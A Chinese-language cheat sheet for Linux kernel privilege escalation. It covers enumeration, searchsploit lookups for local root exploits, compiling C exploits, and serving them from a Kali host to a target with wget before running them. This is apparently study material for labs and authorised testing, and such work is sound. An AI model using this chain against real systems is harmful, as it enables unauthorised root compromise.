============================================================
一、Kernel / OS 基础枚举
============================================================

cat /etc/os-release                         # 查看 Linux 发行版信息，例如 Ubuntu / Debian / CentOS
lsb_release -a 2>/dev/null                  # 查看发行版详细版本，部分系统可能没有该命令
hostnamectl 2>/dev/null                     # 查看系统版本、架构、主机名、Kernel 信息
uname -a                                    # 查看完整 Kernel 信息
uname -r                                    # 只查看 Kernel 版本
uname -m                                    # 查看系统架构，例如 x86_64 / i686 / arm
cat /proc/version                           # 查看 Kernel 编译信息

============================================================
二、Ubuntu / Debian Kernel 包信息
============================================================

dpkg -l | grep linux-image                  # 查看已安装的 Linux Kernel 镜像包
dpkg -l | grep linux-headers                # 查看已安装的 Kernel headers
apt list --installed 2>/dev/null | grep linux-image     # 查看已安装 Kernel 包，Ubuntu/Debian 可用

============================================================
三、CentOS / RHEL Kernel 包信息
============================================================

rpm -qa | grep kernel                       # 查看已安装的 Kernel 包
cat /etc/redhat-release                     # 查看 CentOS / RHEL 发行版版本

============================================================
四、编译环境检查
============================================================

which gcc                                   # 查看目标机是否有 gcc
gcc --version                               # 查看 gcc 版本
which cc                                    # 查看是否存在 cc 编译器
which make                                  # 查看是否存在 make
file exploit                                # 查看 exploit 二进制架构和链接方式
ldd exploit                                 # 查看 exploit 依赖的动态库

============================================================
五、Kernel 安全机制检查
============================================================

cat /proc/sys/kernel/kptr_restrict          # 查看 Kernel 指针泄露限制
cat /proc/sys/kernel/dmesg_restrict         # 查看 dmesg 访问限制
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null       # 查看 ptrace 限制
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null # 查看非特权用户命名空间是否开启
cat /proc/cpuinfo | grep -i smep            # 查看 CPU 是否支持 SMEP
cat /proc/cpuinfo | grep -i smap            # 查看 CPU 是否支持 SMAP

============================================================
六、一键收集 Kernel 信息
============================================================

cat /etc/os-release; echo; uname -a; echo; uname -r; echo; uname -m; echo; cat /proc/version; echo; dpkg -l | grep linux-image 2>/dev/null; rpm -qa | grep kernel 2>/dev/null

============================================================
七、根据 Kernel 信息构造搜索关键词
============================================================

Ubuntu 16.04 Linux kernel 4.4.0 privilege escalation        # 通用搜索关键词
Ubuntu 16.04 4.4.0-116-generic local root exploit           # 精确 Kernel 版本搜索
Linux kernel 4.4.0 local privilege escalation CVE           # Kernel + CVE 搜索
Linux kernel 4.4 overlayfs privilege escalation             # 按漏洞类型搜索
Linux kernel 4.4 dirty cow privilege escalation             # 按知名漏洞搜索

============================================================
八、searchsploit 基础用法
============================================================

searchsploit "关键词"                         # 搜索漏洞
searchsploit --id "关键词"                    # 搜索并显示 EDB-ID
searchsploit -w "关键词"                      # 搜索并显示 Exploit-DB 网页链接
searchsploit -p EDB-ID                        # 根据 EDB-ID 显示本地路径
searchsploit -m EDB-ID                        # 把 exploit 复制到当前目录
searchsploit -x EDB-ID                        # 直接查看 exploit 内容

============================================================
九、searchsploit Kernel 搜索模板
============================================================

searchsploit linux kernel privilege escalation                    # 搜索 Linux Kernel 提权
searchsploit "linux kernel 4.4 privilege escalation"              # 搜索 Kernel 4.4 提权
searchsploit "ubuntu 16.04 privilege escalation"                  # 搜索 Ubuntu 16.04 提权
searchsploit "ubuntu 16.04 kernel 4.4.0 local privilege escalation" # 搜索具体系统和 Kernel
searchsploit "4.4.0-116-generic"                                  # 搜索精确 Kernel 版本
searchsploit "Linux Kernel < 4.4.0-116"                           # 搜索小于某 Kernel 版本的漏洞

============================================================
十、searchsploit 显示 EDB-ID 和链接
============================================================

searchsploit --id "Linux Kernel < 4.4.0-116"       # 显示对应漏洞的 EDB-ID
searchsploit -w "Linux Kernel < 4.4.0-116"         # 显示对应漏洞的 Exploit-DB 链接
searchsploit -p 44298                              # 根据 EDB-ID 查看本地路径
searchsploit -x 44298                              # 根据 EDB-ID 查看 exploit 内容
searchsploit -m 44298                              # 根据 EDB-ID 复制 exploit 到当前目录

============================================================
十一、在本地 Exploit-DB 目录里搜索
============================================================

grep -R "4.4.0-116" /usr/share/exploitdb/exploits/linux/local/ 2>/dev/null          # 搜索精确 Kernel 版本
grep -R "Ubuntu 16.04" /usr/share/exploitdb/exploits/linux/local/ 2>/dev/null       # 搜索 Ubuntu 16.04
grep -R "CVE-" /usr/share/exploitdb/exploits/linux/local/ 2>/dev/null | grep "4.4" # 搜索 Kernel 4.4 相关 CVE
grep -R "gcc" /usr/share/exploitdb/exploits/linux/local/ 2>/dev/null | grep "4.4"  # 搜索可能包含编译说明的 exploit

============================================================
十二、查看 exploit 源码说明
============================================================

head -n 100 exploit.c                         # 查看 exploit 前 100 行说明
grep -i "CVE\|ubuntu\|kernel\|tested\|usage\|compile\|gcc" exploit.c  # 搜索关键信息
less exploit.c                                # 翻页查看源码
cat exploit.c                                 # 直接输出源码内容

============================================================
十三、编译 C exploit
============================================================

gcc exploit.c -o exploit                      # 最基础编译
gcc exploit.c -o exploit -pthread             # 带 pthread 编译
gcc exploit.c -o exploit -lpthread            # 另一种 pthread 编译方式
gcc exploit.c -o exploit -static              # 静态编译，减少 glibc 版本依赖

============================================================
十四、运行编译后的 exploit
============================================================

chmod +x exploit                              # 添加执行权限
./exploit                                     # 当前目录运行
chmod +x /tmp/exploit                         # 给 /tmp 下 exploit 添加执行权限
/tmp/exploit                                  # 运行 /tmp 下的 exploit
id                                            # 检查是否提权成功
whoami                                        # 查看当前用户

============================================================
十五、Kali 编译后传到目标机
============================================================

gcc exploit.c -o exploit                      # Kali 上编译 exploit
python3 -m http.server 8000                   # Kali 当前目录开启 HTTP 服务
wget http://KALI_IP:8000/exploit -O /tmp/exploit # 目标机下载 exploit
chmod +x /tmp/exploit                         # 目标机添加执行权限
/tmp/exploit                                  # 目标机运行 exploit

============================================================
十六、目标机本地编译
============================================================

wget http://KALI_IP:8000/exploit.c -O /tmp/exploit.c # 下载 C 源码到目标机
gcc /tmp/exploit.c -o /tmp/exploit                   # 目标机本地编译
chmod +x /tmp/exploit                                # 添加执行权限
/tmp/exploit                                         # 运行 exploit

============================================================
十七、常见报错判断
============================================================

GLIBC_2.34 not found                      # Kali 编译环境太新，目标机 glibc 太旧
解决：在目标机本地编译，或用 Ubuntu 16.04 环境编译，或尝试 -static

Permission denied                         # 没有执行权限
解决：chmod +x exploit

No such file or directory                 # 可能路径错、架构不匹配、动态链接器不兼容
检查：file exploit; uname -m; ldd exploit

command not found                         # 当前目录运行时没加 ./
解决：./exploit

Token / compile error                     # 编译参数不对或源码不适配
检查：head -n 100 exploit.c; grep -i "gcc\|compile\|usage" exploit.c

============================================================
十八、Kernel exploit 判断逻辑
============================================================

1. 先确认 OS 版本：cat /etc/os-release
2. 再确认 Kernel 版本：uname -a; uname -r
3. 确认架构：uname -m
4. 检查 gcc：which gcc; gcc --version
5. 用 searchsploit 搜 OS + Kernel + privilege escalation
6. 用 --id 找 EDB-ID
7. 用 -x 查看 exploit 说明
8. 确认 tested on / affected version 是否匹配目标
9. 如果标题写 < 4.4.0-116，而目标正好是 4.4.0-116，需要谨慎，可能已经修复
10. 优先本地编译或用同版本系统编译，避免 glibc 不兼容
11. 运行前确认这是靶场 / 授权环境
12. Kernel exploit 风险较高，通常作为最后提权手段

============================================================
十九、最常用完整流程模板
============================================================

目标机枚举：
cat /etc/os-release; uname -a; uname -r; uname -m; which gcc; gcc --version 2>/dev/null

Kali 搜索：
searchsploit "Ubuntu 16.04 kernel 4.4.0 privilege escalation"

显示 EDB-ID：
searchsploit --id "Ubuntu 16.04 kernel 4.4.0 privilege escalation"

查看链接：
searchsploit -w "Ubuntu 16.04 kernel 4.4.0 privilege escalation"

查看 exploit：
searchsploit -x EDB-ID

复制 exploit：
searchsploit -m EDB-ID

查看编译说明：
head -n 100 exploit.c
grep -i "gcc\|compile\|usage\|tested\|cve" exploit.c

编译：
gcc exploit.c -o exploit

传到目标：
python3 -m http.server 8000
wget http://KALI_IP:8000/exploit -O /tmp/exploit

运行：
chmod +x /tmp/exploit
/tmp/exploit
id